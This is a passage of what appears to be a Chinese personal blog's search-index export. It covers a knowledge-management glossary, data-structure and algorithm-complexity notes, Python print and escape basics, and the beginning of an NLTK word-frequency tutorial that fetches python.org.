title="失败展览会"></a>失败展览会</h2><p>Fail Fair<br>一种企业范围内的活动，目的是展示组织关于关键知识和改进机会的失败，并体现领导层对探索失败、寻求知识的文化意愿。</p><h2 id="试点"><a href="#试点" class="headerlink" title="试点"></a>试点</h2><p>Pilot<br>一个小规模的项目，用来检验组织某个部分的KM框架，并向业务利益相关者展示KM的价值。试点还应该产生见解，从而改进KM框架。</p><h2 id="实践所有者"><a href="#实践所有者" class="headerlink" title="实践所有者"></a>实践所有者</h2><p>Practice Owner<br>某领域专家，负责维护该业务专业实践领域的知识，确保能发展和保持必要的能力，同时配套知识库可用和更新。</p><h2 id="社交媒体"><a href="#社交媒体" class="headerlink" title="社交媒体"></a>社交媒体</h2><p>Social Media<br>在线软件应用，旨在鼓励和促进社会交往。</p><h2 id="社交网络分析"><a href="#社交网络分析" class="headerlink" title="社交网络分析"></a>社交网络分析</h2><p>Social Network Analysis<br>一种方法，描绘团队、社区或组织中的人际交往，评估联系的程度，并确定干预措施来改进知识和信息的流动。</p><h2 id="社会认同"><a href="#社会认同" class="headerlink" title="社会认同"></a>社会认同</h2><p>Social Proof<br>使人相信一种方法的价值，向他们展示和他们情况类似的人从这种方法中受益的例子。</p><h2 id="同行协助"><a href="#同行协助" class="headerlink" title="同行协助"></a>同行协助</h2><p>Peer Assist<br>一种结构化的促进会或研讨会，需要解决问题或战胜挑战的团队，邀请其他业务部门或行业的人，分享经验、见解和知识。</p><h2 id="同行审查"><a href="#同行审查" class="headerlink" title="同行审查"></a>同行审查</h2><p>Peer Review<br>一种结构化的促进会或研讨会，邀请其他业务部门或行业的人，审查另一团队的工作。</p><h2 id="文化"><a href="#文化" class="headerlink" title="文化"></a>文化</h2><p>Culture<br>社区或组织内部表现出来的独特行为、假设和价值观模式。因为它们融入了行为，所以很难简单地通过吸引人的理由来改变，而是必须通过系统的变革计划，实施新的流程、角色和其他推动因素。</p><h2 id="无形资产"><a href="#无形资产" class="headerlink" title="无形资产"></a>无形资产</h2><p>Intangible Assets<br>一个组织的资产，但不能像现金、设施或设备这些有形资产一样量化和列在资产负债表上。无形资产的例子有名声、商誉、客户资本、人力资本或能力。知识是一种重要的无形资产。</p><h2 id="问答论坛"><a href="#问答论坛" class="headerlink" title="问答论坛"></a>问答论坛</h2><p>Q&amp;A Forum<br>一个基于电子邮件的讨论论坛，围绕着问题和答案建立。这些可以成为在实践社区内交流知识的一种强大手段。社区成员可以在论坛里提问，由他们在世界其他地方的同行回答。</p><h2 id="维基"><a href="#维基" class="headerlink" title="维基"></a>维基</h2><p>Wiki<br>一组网页，读者通过网页浏览器界面可以直接编辑。</p><h2 id="维基马拉松"><a href="#维基马拉松" class="headerlink" title="维基马拉松"></a>维基马拉松</h2><p>Wikithon<br>一个促进活动，一组知识所有者或实践社区成员一起在维基平台上合成集体知识库。</p><h2 id="显性知识"><a href="#显性知识" class="headerlink" title="显性知识"></a>显性知识</h2><p>Explicit Knowledge<br>以前的定义是显性知识是可以表达和描述的知识。如今，这个术语已经变成了编码知识的同义词。</p><h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>Information<br>能告诉你一些事情的数据的集合和呈现。</p><h2 id="信息架构师"><a href="#信息架构师" class="headerlink" title="信息架构师"></a>信息架构师</h2><p>Information Architect<br>一个角色，负责在门户网站或知识库这样的系统中设计信息和知识环境，以便用户可以轻松浏览和检索信息资源。</p><h2 id="行动前审查"><a href="#行动前审查" class="headerlink" title="行动前审查"></a>行动前审查</h2><p>Baton Passing<br>一种促进讨论会，在项目或活动周期开始前，确定与项目有关的知识需求和优先学习的内容。</p><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>Learning<br>由于获得新的见解和知识，从而改进做事方式。</p><h2 id="学习历史学家"><a href="#学习历史学家" class="headerlink" title="学习历史学家"></a>学习历史学家</h2><p>Learning Historian<br>一个角色，负责通过访谈、数据收集和分析来创造可学习的历史。从特定的活动或事件中萃取可学习的知识，并就经验教训的应用给出指导方针。</p><h2 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h2><p>Metadata<br>描述数据或文档属性的数据，例如标题、作者、创建日期、主题、结构、安全分类。元数据有助于内容的管理，并支持对内容的访问，例如通过搜索。</p><h2 id="隐性知识"><a href="#隐性知识" class="headerlink" title="隐性知识"></a>隐性知识</h2><p>Tacit Knowledge<br>保存在人的头脑和身体中的知识，有可能写下来，也有可能无法记录。</p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>Validate<br>确保某件事中的教训或知识点是有效与可防范的，并可作为最佳实践，在将来可以应用。</p><h2 id="Yammer黄页"><a href="#Yammer黄页" class="headerlink" title="Yammer黄页"></a>Yammer黄页</h2><p>Yellow Pages<br>一种商用微博工具，微博支持分享短消息和更新。见“找人”。</p><h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><p>Best Practice<br>一种做事的实践或方法，经过确认和验证，是目前已知最好的做事方法。</p><h2 id="治理"><a href="#治理" class="headerlink" title="治理"></a>治理</h2><p>Governance<br>通过架构、政策、指标、绩效管理和支持的组合，实现对组织职能的有效管理、监督和问责。</p><h2 id="战略知识领域"><a href="#战略知识领域" class="headerlink" title="战略知识领域"></a>战略知识领域</h2><p>Strategic Knowledge Areas<br>战略中基于知识的能力，对组织的效率和竞争至关重要。</p><h2 id="找人"><a href="#找人" class="headerlink" title="找人"></a>找人</h2><p>People Finder<br>一个知识目录，将人名与知识领域匹配，用以帮助员工找出在组织中“谁知道什么”。</p><h2 id="自动分类工具"><a href="#自动分类工具" class="headerlink" title="自动分类工具"></a>自动分类工具</h2><p>Autoclassification Tools<br>给信息和知识资产自动分配标签或分类主题的软件工具。它们可以按给用户的检验标签或主题工作，或者它们可以完全自动化，在后台工作，不用人干预。</p><h2 id="专家系统"><a href="#专家系统" class="headerlink" title="专家系统"></a>专家系统</h2><p>Expert System<br>一种系统，将专家的知识和决策规则嵌入软件应用中的算法与工作流程。</p><h2 id="资源映射"><a href="#资源映射" class="headerlink" title="资源映射"></a>资源映射</h2><p>Resource Mapping<br>一种结构化和形象的方法，可确定KM实施所需的资源，还有谁将负责贡献这些资源。</p><h2 id="专业支持律师"><a href="#专业支持律师" class="headerlink" title="专业支持律师"></a>专业支持律师</h2><p>Professional Support Lawyer, PSL<br>律师事务所的一个角色，负责提建议，运用先例和诀窍，为客户提供培训和支持。</p><h2 id="政策"><a href="#政策" class="headerlink" title="政策"></a>政策</h2><p>Policy<br>对特定活动领域相关雇员期望的明确说明，阐明指导原则、角色和责任、支持指南。</p><h2 id="主题专家"><a href="#主题专家" class="headerlink" title="主题专家"></a>主题专家</h2><p>Subject Matter Expert<br>社区或职能中的某人，拥有子领域主题知识的所有权或管理权，并代表社区或组织管理该子领域，经常接受实践所有者的指导或监督。</p><h2 id="知识资产创造流程"><a href="#知识资产创造流程" class="headerlink" title="知识资产创造流程"></a>知识资产创造流程</h2><p>Knowledge Asset Creation Process,KNAC<br>由西门子开发的一个五步过程，用来围绕一个特定的主题或产品创造合成知识资产。</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>Knowledge<br>让你采取有效行动的诀窍、技巧、经验、理解和经验法则。另见显性知识和隐性知识。</p><h2 id="知识分析师"><a href="#知识分析师" class="headerlink" title="知识分析师"></a>知识分析师</h2><p>Knowledge Analyst<br>一种角色，负责围绕来自不同知识库的具体主题，检索和整理知识资源，并准备向内部或外部客户汇报。</p><h2 id="知识资产"><a href="#知识资产" class="headerlink" title="知识资产"></a>知识资产</h2><p>Knowledge Assets<br>分散独立、可识别的知识项目或集合，有助于使组织有效地工作。知识资产覆盖了从显性到隐性知识类型的整个范围。它们包括技巧、能力、方法、实践、经验领域、专业知识和关系资本。</p><h2 id="知识审计"><a href="#知识审计" class="headerlink" title="知识审计"></a>知识审计</h2><p>Knowledge Audit<br>一个总称，指系统地评估知识资产、知识差距、知识流和KM流程，目标是提出改进建议。通常是KM实施详细规划过程的一部分。</p><h2 id="知识库"><a href="#知识库" class="headerlink" title="知识库"></a>知识库</h2><p>Knowledge Bank, Knowledge Base<br>收藏组织或实践社区的显性知识的地方。</p><h2 id="知识经纪人"><a href="#知识经纪人" class="headerlink" title="知识经纪人"></a>知识经纪人</h2><p>Knowledge Broker<br>一种角色，将他们与工作之外的知识和信息联系起来，通常通过同事自己的社交网络。</p><h2 id="知识咖啡馆"><a href="#知识咖啡馆" class="headerlink" title="知识咖啡馆"></a>知识咖啡馆</h2><p>Knowledge Café<br>一种促进性大型会议，通常在咖啡厅风格的桌子旁进行，在会上小组分享对话。一般每桌都有一位引导员促进对话，在每个对话周期结束时，同桌的其他参与者分开，加入不同小组和不同桌子。知识咖啡馆有利于给复杂的问题或挑战带来多个视角，并加强交流和建立关系。</p><h2 id="知识获取和记录"><a href="#知识获取和记录" class="headerlink" title="知识获取和记录"></a>知识获取和记录</h2><p>Knowledge Capture, Knowledge Documentation<br>将隐性知识记录为编码形式，从而成为显性知识的过程。</p><h2 id="知识工程师"><a href="#知识工程师" class="headerlink" title="知识工程师"></a>知识工程师</h2><p>Knowledge Engineer<br>一种角色，负责从专家、团队或部门获取知识。</p><h2 id="知识交换"><a href="#知识交换" class="headerlink" title="知识交换"></a>知识交换</h2><p>Knowledge Exchange<br>一种会议，许多人在会上讨论和互相学习，在知识交流的过程中，每个人都是贡献者，同时也是学习者。</p><h2 id="知识展览会"><a href="#知识展览会" class="headerlink" title="知识展览会"></a>知识展览会</h2><p>Knowledge Fair<br>一种组织范围的活动，目的是展示其知识能力和显示KM的好处。</p><h2 id="知识移交"><a href="#知识移交" class="headerlink" title="知识移交"></a>知识移交</h2><p>Knowledge Handover<br>一个促进的过程，将已经完成项目的项目组获得的经验教训转移给可能需要该知识的其他项目组。</p><h2 id="知识管理"><a href="#知识管理" class="headerlink" title="知识管理"></a>知识管理</h2><p>Knowledge Management<br>一种系统的战略方法，将一个组织集体知识的价值最大化。</p><h2 id="知识管理拥护者"><a href="#知识管理拥护者" class="headerlink" title="知识管理拥护者"></a>知识管理拥护者</h2><p>Knowledge Management Champion<br>一种角色，这个人通常除了正规的职能角色，另外被赋予在其业务部分支持KM活动的责任。</p><h2 id="知识管理框架"><a href="#知识管理框架" class="headerlink" title="知识管理框架"></a>知识管理框架</h2><p>Knowledge Management Framework<br>一种框架，描述了KM要有效嵌入组织的工作方式所需的推动因素。</p><h2 id="知识管理计划"><a href="#知识管理计划" class="headerlink" title="知识管理计划"></a>知识管理计划</h2><p>Knowledge Management Plan<br>一种文档，记录了知识需求、知识差距、知识来源和获得策略、知识创造角色、责任和既定项目或活动的流程。</p><h2 id="知识经理"><a href="#知识经理" class="headerlink" title="知识经理"></a>知识经理</h2><p>一种角色，其主要职责是确保其所在组织中团队的知识得到管理，从而实现业务利益。<br>Knowledge Manager</p><h2 id="知识地图"><a href="#知识地图" class="headerlink" title="知识地图"></a>知识地图</h2><p>Knowledge Map<br>一种直观的表示，显示知识资产在组织中的位置和它们如何与关键的功能区和活动相关，或者直观地表示整个组织的知识流和依赖关系。</p><h2 id="知识组织"><a href="#知识组织" class="headerlink" title="知识组织"></a>知识组织</h2><p>Knowledge Organization<br>一套流程，用来组织机构的知识资产，以便能够有效地管理、评估和使用它们。</p><h2 id="知识拥有者"><a href="#知识拥有者" class="headerlink" title="知识拥有者"></a>知识拥有者</h2><p>Knowledge Owner<br>管理特定领域的知识，负责知识库的内容，保持其准确、完整和处于最新状态。</p><h2 id="知识保留"><a href="#知识保留" class="headerlink" title="知识保留"></a>知识保留</h2><p>Knowledge Retention<br>一套流程，用来在个别人员流动时，将重要知识留在组织内。通常把重点放在隐性知识的保留和传递上。</p><h2 id="知识整合"><a href="#知识整合" class="headerlink" title="知识整合"></a>知识整合</h2><p>Knowledge Synthesis<br>将来自多个源头的知识编纂，并提取到一套格式一致的指导性文件中，以便参考。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识整理 </tag>
            
            <tag> 读书笔记 </tag>
            
            <tag> mind </tag>
            
            <tag> 知识地图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性表</title>
      <link href="/cs/%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
      <url>/cs/%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>数据结构之线性表<br><a id="more"></a></p><h2 id="线性表的定义"><a href="#线性表的定义" class="headerlink" title="线性表的定义"></a>线性表的定义</h2><p><img src="https://upload-images.jianshu.io/upload_images/6908911-957dd1bf3b253047.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="线性表的定义"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-b5651d8755dc784b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="线性表的定义"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-a32d5e37c6c288b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="线性结构分类"></p><h2 id="线性表的基本操作"><a href="#线性表的基本操作" class="headerlink" title="线性表的基本操作"></a>线性表的基本操作</h2><p><img src="https://upload-images.jianshu.io/upload_images/6908911-8732b0dcfa33f8fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="线性表的基本操作"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-5cf609d3da3bb9fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="线性表的基本操作"></p><h2 id="线性表两种存储结构各自的特点及比较"><a href="#线性表两种存储结构各自的特点及比较" class="headerlink" title="线性表两种存储结构各自的特点及比较"></a>线性表两种存储结构各自的特点及比较</h2><p><img src="https://upload-images.jianshu.io/upload_images/6908911-4d945d62429f9cd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="两种存储结构"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-56758df782fec87f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="比较"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-697d8320970c22df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="比较"></p><p><img src="https://upload-images.jianshu.io/upload_images/6908911-9f2c8facfb0f1f41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数据结构、线性结构"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-1e08ecb6e76d2b4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="存储结构比较：效率"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-4a41ce148eb75fb6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="存储结构比较：地址连续性"></p><h2 id="线性表的实现：存储结构及应用"><a href="#线性表的实现：存储结构及应用" class="headerlink" title="线性表的实现：存储结构及应用"></a>线性表的实现：存储结构及应用</h2><p><img src="https://upload-images.jianshu.io/upload_images/6908911-22431cb8b3461932.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="存储结构分类"></p><h2 id="顺序存储结构"><a href="#顺序存储结构" class="headerlink" title="顺序存储结构"></a>顺序存储结构</h2><p><img src="https://upload-images.jianshu.io/upload_images/6908911-ff0261d520374613.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="顺序表结构示意图"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-7b939d020770a0ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="顺序表结构体"></p><h2 id="顺序存储结构的基本操作"><a href="#顺序存储结构的基本操作" class="headerlink" title="顺序存储结构的基本操作"></a>顺序存储结构的基本操作</h2><p><img src="https://upload-images.jianshu.io/upload_images/6908911-ceea8b7b425d0c4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="创建清空判断更新"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-e09d194846e7ff4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="插入元素"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-038cdb3b411571ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="删除元素"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-6cbbd209cfd493c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="删除元素"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-76b50c91eff4215c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="插入和删除"></p><h2 id="链式存储结构"><a href="#链式存储结构" class="headerlink" title="链式存储结构"></a>链式存储结构</h2><p><img src="https://upload-images.jianshu.io/upload_images/6908911-1c2d238a8c333fe5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="链式存储结构"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-47c1b9529b3e7703.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="链式存储结构基本操作"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-381c02ed527bc9d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="链式存储结构基本操作"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-080b3d00bc2cdf75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="链式存储结构基本操作"></p><h2 id="其他常见的链式存储结构"><a href="#其他常见的链式存储结构" class="headerlink" title="其他常见的链式存储结构"></a>其他常见的链式存储结构</h2><p><img src="https://upload-images.jianshu.io/upload_images/6908911-8e998b4aa32070d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="其他常见的链式存储结构"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-561212d0e36619f3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="其他常见的链式存储结构"><br><img src="https://upload-images.jianshu.io/upload_images/6908911-a16f9d12d9b8e5e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="其他常见的链式存储结构"></p><p>线性表的应用<br>链式存储结构中指针的操作<br>链式存储结构中单链表的应用场合<br>带表头结点的单链表的应用场合<br>循环链表、的应用场合<br>双向循环链表的应用场合</p>]]></content>
      
      
      
        <tags>
            
            <tag> wiki </tag>
            
            <tag> fix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法</title>
      <link href="/cs/%E7%AE%97%E6%B3%95/"/>
      <url>/cs/%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>算法百科<br><a id="more"></a><br>数据结构与算法的关系:相互依赖不可分割的.<br>算法的定义:算法是解决特定问题求解步骤的描述,在计算机中为指令的有限序列,并且每条指令表示一个或多个操作。<br>算法的特性:有穷性、确定性、可行性、输入、输出。<br>算法的设计的要求:正确性、可读性、健壮性、高效率和低存储量需求。<br>算法特性与算法设计容易混,需要对比记忆。<br>算法的度量方法:事后统计方法(不科学、不准确)、事前分析估算方法。<br>在讲解如何用事前分析估算方法之前,我们先给出了函数渐近增长的定义。</p><h1 id="函数的渐近增长"><a href="#函数的渐近增长" class="headerlink" title="函数的渐近增长"></a>函数的渐近增长</h1><p>给定两个函数f(n)和g(n),<br>如果存在一个整数N,使得对于所有的n&gt;N,f(n)总是比g(n)大,那么,我们说fn)的增长渐近快于g(n)。<br>于是我们可以得出一个结论,判断一个算法好不好,我们只迪过少量的数据是不能做出准确判断的<br>对比算法的关键执行次数函数的渐近增长性,基本就可以分析出:某个算法,随着n的变大,它会越来越优于另一算法,或者越来越差于另一算法。<br>算法时间复杂度的定义</p><p>#推导大O阶的步骤</p><blockquote><p>用常数1取代运行时间中的所有加法常数。<br> 在修改后的运行次数函数中,只保留最高阶项。<br> 如果最高阶项存在且不是1,则去除与这个项相乘的常数。 </p></blockquote><p>得到的结果就是大0阶。<br>在得到算法的运行次数表达式后,很快得到它的时间复杂度,即大0阶。<br>推导大0阶很容易,但如何得到运行次数的表达式却是需要数学功底的。</p><h1 id="常见的时间复杂度所耗时间的大小排列"><a href="#常见的时间复杂度所耗时间的大小排列" class="headerlink" title="常见的时间复杂度所耗时间的大小排列"></a>常见的时间复杂度所耗时间的大小排列</h1><p>O(1)&lt;O(logn)&lt;O(n)&lt;O(nlogn)&lt;O(n2)&lt;O(n3)&lt;O(2”)&lt;O(n!)&lt;O(n”)<br>算法最坏情况和平均情况<br>空间复杂度<br>弄明白算法的时间复杂度的估算<br>深究自己写的代码是否效率低下,是不是可以通过优化让计算机更加快速高效。</p><h1 id="CPU与算法"><a href="#CPU与算法" class="headerlink" title="CPU与算法"></a>CPU与算法</h1><p>现在CPU越来越快,根本不用考虑算法的优劣,实现功能即可,用户感觉不到算法好坏造成的快慢？</p><p><blockquote>假设CPU在短短几年间,速度提高了100倍,这其实已经很夸张了。<br>而我们的某个算法本可以写出时间复杂度是O(n)的程序,却写出了0(n2)的程序,仅仅因为容易想到,也容易写。<br>即在O(n2)的时间复杂度算法程序下,速度其实只提高了10(√100=10),而对于0(n)时间复杂度的算法来说,那才是真的100倍。<br>也就是说,一台老式CPU的计算机运行O(n)的程序和一台速度提高100倍新式CPU运行O(n2)的程序。</blockquote><br>最终效率高的胜利方却是老式CPU的计算机,原因就在于算法的优劣直接决定了程序运行的效率。</p>]]></content>
      
      
      
        <tags>
            
            <tag> wiki </tag>
            
            <tag> fix </tag>
            
            <tag> mind </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序可交互</title>
      <link href="/cs/%E7%A8%8B%E5%BA%8F%E5%8F%AF%E4%BA%A4%E4%BA%92/"/>
      <url>/cs/%E7%A8%8B%E5%BA%8F%E5%8F%AF%E4%BA%A4%E4%BA%92/</url>
      
        <content type="html"><![CDATA[<p>input():带提示语的input。name=input(‘Please enter your name:’) 把输入以字符串的形式保存在name里<br>print():print<code>多项</code>、print的<code>%</code>格式化占位符、print的<code>format</code>形式 #可以接收多参<br>三引号：原样输出<br>转意符号<br>学习，思考，应用，校正。人做事情，都需要有个反馈，反馈的周期越久，感觉上就越困难。很多大事情，都是由一个个小事务重复或迭代而成，每个小事务中，包含了反馈和校正。学了什么，启示是什么，和其它知识的联系是什么<br><a id="more"></a><br>r:优先级最高<br>\:把字母转义为特殊字符。防止引号表示字符串。</p><p>\n:制表符<br>\t:换行符<br><code>`</code>PY<br>print(‘a\nb’)<br>print(r’a\nb’)<br>print(‘I\’m OK’)</p><h1 id="a"><a href="#a" class="headerlink" title="a"></a>a</h1><h1 id="b"><a href="#b" class="headerlink" title="b"></a>b</h1><h1 id="a-nb"><a href="#a-nb" class="headerlink" title="a\nb"></a>a\nb</h1><h1 id="I’m-OK"><a href="#I’m-OK" class="headerlink" title="I’m OK"></a>I’m OK</h1>]]></content>
      
      
      
        <tags>
            
            <tag> python基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>清洗+词频统计+排序+nltk+可视化</title>
      <link href="/cs/%E6%B8%85%E6%B4%97+%E8%AF%8D%E9%A2%91%E7%BB%9F%E8%AE%A1+%E6%8E%92%E5%BA%8F+nltk+%E5%8F%AF%E8%A7%86%E5%8C%96/"/>
      <url>/cs/%E6%B8%85%E6%B4%97+%E8%AF%8D%E9%A2%91%E7%BB%9F%E8%AE%A1+%E6%8E%92%E5%BA%8F+nltk+%E5%8F%AF%E8%A7%86%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>学习笔记：机器学习之NLTK<br><a id="more"></a></p><h3 id="词频统计"><a href="#词频统计" class="headerlink" title="词频统计"></a>词频统计</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'Hello Python. I like Python.'</span></span><br><span class="line">word_freq=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> tok <span class="keyword">in</span> str1.split():</span><br><span class="line">    <span class="keyword">if</span> tok <span class="keyword">in</span> word_freq:</span><br><span class="line">        word_freq[tok]+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        word_freq[tok]=<span class="number">1</span></span><br><span class="line">print(word_freq)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&#123;<span class="string">'Hello'</span>: <span class="number">1</span>, <span class="string">'Python.'</span>: <span class="number">2</span>, <span class="string">'I'</span>: <span class="number">1</span>, <span class="string">'like'</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h4><p><code>for tok in str1.split():</code> 注意in 后面接了个返回列表的函数。<br><code>if tok in word_freq:</code> 键是如何作用于字典的。<br><code>word_freq[tok]+=1</code> 字典是如何用键操作值的。</p><h3 id="函数式统计词频"><a href="#函数式统计词频" class="headerlink" title="函数式统计词频"></a>函数式统计词频</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wordfreq</span><span class="params">(str1)</span>:</span></span><br><span class="line">    word_freq=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> tok <span class="keyword">in</span> str1.split():</span><br><span class="line">        <span class="keyword">if</span> tok <span class="keyword">in</span> word_freq:</span><br><span class="line">            word_freq[tok]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            word_freq[tok]=<span class="number">1</span></span><br><span class="line">    print(word_freq)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    str1=<span class="string">'Hello Python. I like Python.'</span></span><br><span class="line">    wordfreq(str1)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>等价于<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wordfreq</span><span class="params">(str1)</span>:</span></span><br><span class="line">    word_freq=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> tok <span class="keyword">in</span> str1.split():</span><br><span class="line">        <span class="keyword">if</span> tok <span class="keyword">in</span> word_freq:</span><br><span class="line">            word_freq[tok]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            word_freq[tok]=<span class="number">1</span></span><br><span class="line">    print(word_freq)</span><br><span class="line">str1=<span class="string">'Hello Python. I like Python.'</span></span><br><span class="line">wordfreq(str1)</span><br></pre></td></tr></table></figure></p><h3 id="python官网网站源码"><a href="#python官网网站源码" class="headerlink" title="python官网网站源码"></a>python官网网站源码</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HtmlText</span><span class="params">(url0)</span>:</span></span><br><span class="line">    html0 = requests.get(url).text</span><br><span class="line">    <span class="keyword">return</span> html0</span><br><span class="line">url=<span class="string">'http://python.org/'</span></span><br><span class="line">html = HtmlText(url)</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure><h3 id="清理数据"><a href="#清理数据" class="headerlink" title="清理数据"></a>清理数据</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HtmlText</span><span class="params">(url0)</span>:</span></span><br><span class="line">    html0 = requests.get(url).text</span><br><span class="line">    <span class="keyword">return</span> html0</span><br><span class="line">url = <span class="string">'http://python.org/'</span></span><br><span class="line">html = HtmlText(url)</span><br><span class="line"><span class="comment"># print(html)</span></span><br><span class="line"><span class="comment"># ~~~~~~~~~~数据清理~~~~~~~~~~~</span></span><br><span class="line"><span class="comment">#==================普通分割str.split===============</span></span><br><span class="line"><span class="comment"># tokens = [tok for tok in html.split()]  #可直接运行</span></span><br><span class="line"><span class="comment">#==================正则分割re.split================</span></span><br><span class="line"><span class="comment">#-----------------\W匹配任意非单词性字符---------</span></span><br><span class="line"><span class="comment"># import re</span></span><br><span class="line"><span class="comment"># tokens = [tok for tok in re.split('\W+',html)] #可直接运行</span></span><br><span class="line"><span class="comment">#==================NLTK的clean_html================</span></span><br><span class="line"><span class="comment">#!!!!! 报错</span></span><br><span class="line"><span class="comment">#import nltk </span></span><br><span class="line"><span class="comment"># clean = 